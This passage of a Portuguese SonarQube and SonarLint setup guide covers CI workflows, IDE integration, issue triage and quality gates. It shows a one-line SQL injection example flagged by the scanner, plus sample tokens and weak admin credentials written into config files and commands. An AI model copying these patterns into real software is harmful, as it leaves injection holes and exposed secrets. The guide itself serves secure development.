    networks:
      - sonarnet

volumes:
  sonarqube_data:
  sonarqube_extensions:
  sonarqube_logs:
  postgresql_data:

networks:
  sonarnet:
    driver: bridge
```

**Passo 2 - Iniciar containers:**

```bash
# Subir SonarQube + PostgreSQL
docker-compose up -d

# Verificar logs
docker-compose logs -f sonarqube

# Aguardar inicialização (pode levar 2-3 minutos)
```

**Passo 3 - Acessar interface:**

```
URL: http://localhost:9000
Login: admin
Senha: admin (será solicitado para alterar)
```

---

#### Configuração Inicial

**1. Alterar senha admin:**

```
Settings → Security → Users → Administrator
→ Change Password → NewSecurePassword123!
```

**2. Gerar Token de Autenticação:**

```
My Account → Security → Generate Tokens

Name: github-actions
Type: Global Analysis Token
Expires in: 90 days

Generated Token: squ_a3f7c8e9d2b1c4a5b6f8e7d9c1a2b3d4e5f6a7b8
```

> **⚠️ Importante:** Salve este token - ele não será exibido novamente!

**3. Criar Projeto:**

```bash
# Via interface:
Create Project → Manually
Project Key: my-app
Display Name: My Application

# Ou via API:
curl -u admin:admin123 -X POST \
  'http://localhost:9000/api/projects/create' \
  -d 'name=my-app&project=my-app'
```

**4. Configurar Quality Gate:**

```
Quality Gates → Create → Custom Gate

Conditions:
- Coverage on New Code: >= 80%
- Duplicated Lines on New Code: < 3%
- Maintainability Rating on New Code: >= A
- Reliability Rating on New Code: >= A
- Security Rating on New Code: >= A
- Security Hotspots Reviewed: 100%

Set as Default
```

---

### 🔧 Integração com GitHub Actions

#### Configuração Completa do Workflow

**Passo 1 - Adicionar secrets no GitHub:**

```
Repository → Settings → Secrets and variables → Actions

Secrets:
- SONAR_TOKEN: squ_a3f7c8e9d2b1c4a5b6f8e7d9c1a2b3d4e5f6a7b8
- SONAR_HOST_URL: http://your-sonarqube-server:9000
```

**Passo 2 - Criar `.github/workflows/sonarqube.yml`:**

```yaml
name: SonarQube Analysis

on:
  push:
    branches:
      - main
      - develop
  pull_request:
    types: [opened, synchronize, reopened]

jobs:
  sonarqube:
    name: SonarQube Scan
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          fetch-depth: 0  # Full history for better analysis
      
      - name: Set up JDK 17
        uses: actions/setup-java@v3
        with:
          java-version: '17'
          distribution: 'temurin'
      
      - name: Cache SonarQube packages
        uses: actions/cache@v3
        with:
          path: ~/.sonar/cache
          key: ${{ runner.os }}-sonar
          restore-keys: ${{ runner.os }}-sonar
      
      - name: Cache Maven packages
        uses: actions/cache@v3
        with:
          path: ~/.m2
          key: ${{ runner.os }}-m2-${{ hashFiles('**/pom.xml') }}
          restore-keys: ${{ runner.os }}-m2
      
      - name: Run Tests with Coverage
        run: mvn clean verify
      
      - name: SonarQube Scan
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}
        run: |
          mvn sonar:sonar \
            -Dsonar.projectKey=my-app \
            -Dsonar.projectName="My Application" \
            -Dsonar.host.url=$SONAR_HOST_URL \
            -Dsonar.token=$SONAR_TOKEN \
            -Dsonar.java.coveragePlugin=jacoco \
            -Dsonar.coverage.jacoco.xmlReportPaths=target/site/jacoco/jacoco.xml
      
      - name: Quality Gate Check
        uses: sonarsource/sonarqube-quality-gate-action@master
        timeout-minutes: 5
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}
        with:
          scanMetadataReportFile: target/sonar/report-task.txt
      
      - name: Comment PR with SonarQube Results
        if: github.event_name == 'pull_request'
        uses: actions/github-script@v7
        with:
          script: |
            const fs = require('fs');
            const reportTask = fs.readFileSync('target/sonar/report-task.txt', 'utf8');
            const dashboardUrl = reportTask.match(/dashboardUrl=(.*)/)[1];
            
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: `## 🔍 SonarQube Analysis\n\n[View Full Report](${dashboardUrl})`
            });
```

**Passo 3 - Configurar `pom.xml` (Java/Maven):**

```xml
<project>
  <!-- ... -->
  
  <properties>
    <sonar.organization>my-org</sonar.organization>
    <sonar.host.url>https://sonarcloud.io</sonar.host.url>
    <sonar.coverage.jacoco.xmlReportPaths>
      ${project.build.directory}/site/jacoco/jacoco.xml
    </sonar.coverage.jacoco.xmlReportPaths>
  </properties>
  
  <build>
    <plugins>
      <!-- JaCoCo plugin for code coverage -->
      <plugin>
        <groupId>org.jacoco</groupId>
        <artifactId>jacoco-maven-plugin</artifactId>
        <version>0.8.11</version>
        <executions>
          <execution>
            <goals>
              <goal>prepare-agent</goal>
            </goals>
          </execution>
          <execution>
            <id>report</id>
            <phase>test</phase>
            <goals>
              <goal>report</goal>
            </goals>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
```

---

#### Workflow para Node.js/TypeScript

```yaml
name: SonarQube Node.js

on:
  push:
    branches: [main]
  pull_request:
    types: [opened, synchronize, reopened]

jobs:
  sonarqube:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run tests with coverage
        run: npm test -- --coverage
      
      - name: SonarQube Scan
        uses: sonarsource/sonarqube-scan-action@master
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}
        with:
          args: >
            -Dsonar.projectKey=my-node-app
            -Dsonar.sources=src
            -Dsonar.tests=tests
            -Dsonar.javascript.lcov.reportPaths=coverage/lcov.info
            -Dsonar.testExecutionReportPaths=coverage/test-report.xml
      
      - name: Quality Gate
        uses: sonarsource/sonarqube-quality-gate-action@master
        timeout-minutes: 5
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
```

**Arquivo `sonar-project.properties` (raiz do projeto):**

```properties
sonar.projectKey=my-node-app
sonar.projectName=My Node.js Application
sonar.projectVersion=1.0

# Source code
sonar.sources=src
sonar.tests=tests

# Exclusions
sonar.exclusions=**/*.spec.ts,**/*.test.ts,**/node_modules/**,**/dist/**

# Coverage
sonar.javascript.lcov.reportPaths=coverage/lcov.info
sonar.testExecutionReportPaths=coverage/test-report.xml

# Encoding
sonar.sourceEncoding=UTF-8
```

---

#### Workflow para Python

```yaml
name: SonarQube Python

on: [push, pull_request]

jobs:
  sonarqube:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      
      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'
      
      - name: Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt
          pip install pytest pytest-cov
      
      - name: Run tests with coverage
        run: |
          pytest --cov=src --cov-report=xml --cov-report=html
      
      - name: SonarQube Scan
        uses: sonarsource/sonarqube-scan-action@master
        env:
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
          SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}
        with:
          args: >
            -Dsonar.projectKey=my-python-app
            -Dsonar.sources=src
            -Dsonar.tests=tests
            -Dsonar.python.coverage.reportPaths=coverage.xml
```

---

### 🔌 Integração com IDEs (SonarLint)

#### VSCode

**Instalação:**

```
Extensions → Search "SonarLint"
→ Install: SonarSource.sonarlint-vscode
```

**Configuração (`.vscode/settings.json`):**

```json
{
  "sonarlint.connectedMode.connections.sonarqube": [
    {
      "serverUrl": "http://localhost:9000",
      "token": "squ_a3f7c8e9d2b1c4a5b6f8e7d9c1a2b3d4e5f6a7b8"
    }
  ],
  "sonarlint.connectedMode.project": {
    "projectKey": "my-app"
  },
  "sonarlint.rules": {
    "java:S1234": {
      "level": "on"
    },
    "java:S2068": {
      "level": "on",
      "parameters": {
        "credentialWords": "password,passwd,pwd,secret,token"
      }
    }
  }
}
```

**Uso:**

```
Análise em tempo real:
- Sublinhados aparecem ao digitar código vulnerável
- Hover para ver explicação
- Ctrl+. para ver quick fixes

Exemplo:
String sql = "SELECT * FROM users WHERE id = " + userId;
         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
         SQL Injection vulnerability (java:S3649)
```

---

#### IntelliJ IDEA

**Instalação:**

```
Settings → Plugins → Marketplace
→ Search "SonarLint" → Install
```

**Configuração:**

```
Settings → Tools → SonarLint → Connected Mode
→ Add Connection
  Server URL: http://localhost:9000
  Token: squ_...
  
→ Bind Project
  Project: my-app
```

**Features:**

```
- Real-time analysis (ao digitar)
- Bulk analysis (todo o projeto)
- Issue navigation (Alt+6)
- Rule descriptions (F1 em issue)
```

---

## 🕵️ Workflow de Análise

### Triagem de Issues

**Passo 1 - Filtrar por severidade:**

```
SonarQube Dashboard → Issues
Filters:
- Type: Vulnerability
- Severity: Blocker, Critical
- Status: Open
- Assigned: Unassigned

Sort by: Creation Date (newest first)
```

**Passo 2 - Análise individual:**

```yaml
Para cada issue:
  1. Ler descrição completa
  2. Verificar "Why is this an issue?"
  3. Analisar código afetado
  4. Verificar "How to fix it"
  5. Determinar ação:
     - Fix: Corrigir código
     - False Positive: Marcar como FP
     - Won't Fix: Aceitar risco (documentar)
```

**Passo 3 - Classificação:**

```
┌─────────────────┬─────────────────┬──────────────────────┐
│ Ação            │ Quando usar     │ Como fazer           │
├─────────────────┼─────────────────┼──────────────────────┤
│ Fix             │ Vulnerabilidade │ Corrigir + Commit    │
│                 │ real            │                      │
├─────────────────┼─────────────────┼──────────────────────┤
│ False Positive  │ Falso alarme    │ Mark as → False      │
│                 │ do scanner      │ Positive + Comment   │
├─────────────────┼─────────────────┼──────────────────────┤
│ Won't Fix       │ Risco aceito    │ Mark as → Won't Fix  │
│                 │ (justificado)   │ + Approval + Comment │
└─────────────────┴─────────────────┴──────────────────────┘
```

---

### Exemplo de Triagem: False Positive

**Issue reportado:**

```java
// SonarQube: Hard-coded password (java:S2068)
public class ConfigLoader {
    private static final String DEFAULT_PASSWORD_PATTERN = 
        "^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)[a-zA-Z\\d]{8,}$";
                    // ^^^^^^^^ Detectado como "password"
}
```

**Análise:**

```
Falso Positivo:
- Não é uma senha literal, é um REGEX pattern
- Usado para validação, não para autenticação
- Sem risco de segurança

Ação: Marcar como False Positive
```

**Marcar no SonarQube:**

```
Issue → More → Mark as False Positive
Comment: |
  This is a regex pattern for password validation, not an actual password.
  It's a constant used to enforce password complexity requirements.
  
  No security risk - marking as False Positive.
  
  Reviewed by: john.doe@company.com
  Date: 2024-02-10
```

---

### Exemplo de Triagem: Won't Fix

**Issue reportado:**

```python
# SonarQube: Weak cryptography (python:S4790)
import hashlib

def generate_cache_key(url):
    return hashlib.md5(url.encode()).hexdigest()
```

**Análise:**

```
Contexto:
- MD5 usado apenas para cache key (ETag)
- NÃO usado para segurança
- Performance é mais importante que collision resistance
- Risco: Baixo (colisão de cache, não vazamento de dados)

Decisão: Aceitar risco (Won't Fix)
```

**Marcar no SonarQube:**

```
Issue → More → Won't Fix
Comment: |
  RISK ACCEPTED
  
  Justification:
  MD5 is used only for generating cache keys (HTTP ETags), not for
  cryptographic purposes. In this context, speed is more important
  than collision resistance.
  
  Compensating Controls:
  - Cache entries expire after 1 hour
  - No sensitive data stored in cache
  - Collision would only result in cache miss (no security impact)
  
  Approved by: Security Team (jane.smith@company.com)
  Date: 2024-02-10
  Review Date: 2025-02-10
```

---

### Workflow de Correção

```mermaid
graph TD
    A[Issue Detectado] --> B{Tipo?}
    B -->|Vulnerability| C[Prioridade ALTA]
    B -->|Bug| D[Prioridade MÉDIA]
    B -->|Code Smell| E[Prioridade BAIXA]
    
    C --> F[Criar branch hotfix/]
    D --> G[Adicionar ao Sprint]
    E --> H[Backlog Tech Debt]
    
    F --> I[Corrigir código]
    G --> I
    H --> I
    
    I --> J[Executar testes]
    J --> K{Passou?}
    K -->|Sim| L[Commit + Push]
    K -->|Não| I
    
    L --> M[CI/CD: SonarQube Scan]
    M --> N{Issue resolvido?}
    N -->|Sim| O[Merge para main]
    N -->|Não| I
    
    O --> P[Issue auto-fechado]
```

---

## 📊 Melhores Práticas

### 1. Quality Gates Customizados

**Exemplo: Quality Gate para Microserviços:**

```yaml
Name: Microservices Gate

Conditions (Overall Code):
  - Security Rating: A
  - Security Hotspots Reviewed: 100%
  - Reliability Rating: A
  - Maintainability Rating: B or higher
  
Conditions (New Code - Strict):
  - Coverage: >= 90%  # Mais alto que padrão
  - Duplicated Lines: < 1%  # Mais rigoroso
  - Bugs: 0
  - Vulnerabilities: 0
  - Code Smells: 0
  - Security Hotspots Reviewed: 100%
  - Cognitive Complexity: < 15
```

**Exemplo: Quality Gate para Projeto Legado:**

```yaml
Name: Legacy Migration Gate

Conditions (Overall Code - Relaxed):
  - Security Rating: C or higher  # Mais permissivo
  - Reliability Rating: C or higher
  - Maintainability Rating: D or higher
  
Conditions (New Code - Strict):
  - Coverage: >= 80%
  - Security Rating: A  # Novo código deve ser seguro
  - Bugs: 0
  - Vulnerabilities: 0
```

---

### 2. Regras Customizadas

**Exemplo: Detectar logger específico da empresa:**

```java
// Regra: Usar logger corporativo ao invés de System.out
public class CustomLoggerRule extends BaseTreeVisitor {
    
    @Override
    public void visitMethodInvocation(MethodInvocationTree tree) {
        if (tree.symbol().owner().type().is("java.io.PrintStream") &&
            tree.symbol().name().equals("println")) {
            
            reportIssue(tree, 
                "Use CompanyLogger instead of System.out.println");
        }
        super.visitMethodInvocation(tree);
    }
}
```

**Configuração no SonarQube:**

```
Rules → Custom Rules → Create
Language: Java
Template: XPath
Rule Key: custom:no-system-out
Name: Avoid System.out usage
Description: Use CompanyLogger.log() instead
Severity: Major
Type: Code Smell

XPath Expression:
//MethodInvocation[
  @MethodName='println' and 
  @DeclaringType='java.io.PrintStream'
]
```

---

### 3. Exclusões Inteligentes

**`sonar-project.properties`:**

```properties
# Excluir arquivos gerados
sonar.exclusions=\
  **/target/**,\
  **/build/**,\
  **/node_modules/**,\
  **/*.generated.java,\
  **/proto/**,\
  **/*Mapper.xml

# Excluir testes de coverage (não de análise)
sonar.coverage.exclusions=\
  **/*Test.java,\
  **/*Tests.java,\
  **/test/**,\
  **/config/**

# Excluir duplicações (DTOs, Entities)
sonar.cpd.exclusions=\
  **/dto/**,\
  **/entity/**,\
  **/model/**
```

---

### 4. Métricas de Acompanhamento

**KPIs para DevSecOps:**

```yaml
Daily:
  - New Vulnerabilities: 0 (bloqueio imediato)
  - Security Hotspots Pending Review: < 5
  
Weekly:
  - Coverage Trend: Increasing
  - Technical Debt: Decreasing
  - Code Smells: < 100 per 1000 lines
  
Monthly:
  - Security Rating: 90% projects with A
  - Reliability Rating: 95% projects with A
  - Quality Gate Pass Rate: > 95%
```

**Dashboard customizado:**

```sql
-- Query para relatório gerencial
SELECT 
    project_key,
    security_rating,
    coverage,
    technical_debt_ratio,
    vulnerabilities,
    bugs,
    code_smells,
    last_analysis_date
FROM projects
WHERE security_rating IN ('D', 'E')
ORDER BY vulnerabilities DESC
LIMIT 10;
```

---

### 5. Integração com Jira

**Webhook do SonarQube → Jira:**

```yaml
# SonarQube Webhook
URL: https://company.atlassian.net/webhook/sonarqube
Events:
  - Quality Gate status changed
  - New vulnerabilities detected

# Automação Jira
Trigger: Webhook received
Condition: payload.qualityGate.status == "ERROR"
Action: Create Issue
  Project: SECURITY
  Issue Type: Bug
  Priority: High
  Summary: "[SonarQube] Quality Gate Failed: {{payload.project.name}}"
  Description: |
    Quality Gate Status: FAILED
    Project: {{payload.project.name}}
    Dashboard: {{payload.project.url}}
    
    Failures:
    {{#each payload.qualityGate.conditions}}
    - {{metric}}: {{value}} (required: {{threshold}})
    {{/each}}
```

---

## 🔗 Links e Referências

- **SonarQube Docs:** https://docs.sonarqube.org/
- **SonarCloud:** https://sonarcloud.io
- **SonarLint:** https://www.sonarsource.com/products/sonarlint/
- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
- **CWE Database:** https://cwe.mitre.org/

---

## 📝 Changelog

|Data|Versão|Alteração|
|---|---|---|
|2024-02-10|1.0|Documento inicial criado|

---

> **💡 Dica final:** Configure um **Pre-Commit Hook** para executar SonarLint localmente antes do push, evitando quebrar o Quality Gate no CI/CD.

```bash
# .git/hooks/pre-commit
#!/bin/bash

echo "Running SonarLint analysis..."
sonarlint analyze --src src/

if [ $? -ne 0 ]; then
    echo "❌ SonarLint found issues. Fix them before committing."
    exit 1
fi

echo "✅ SonarLint passed!"
```

**Comparação SAST vs DAST:**

|Aspecto|SonarQube (SAST)|Tenable (DAST)|
|---|---|---|
|**Timing**|Durante desenvolvimento|Após deployment|
|**Escopo**|Código-fonte|Aplicação rodando|
|**Detecção**|Bugs, vulnerabilidades de código|Falhas de infra, configs|
|**Feedback**|Tempo real (IDE)|Scan agendado|
|**Correção**|Desenvolvedor|DevOps/SRE|

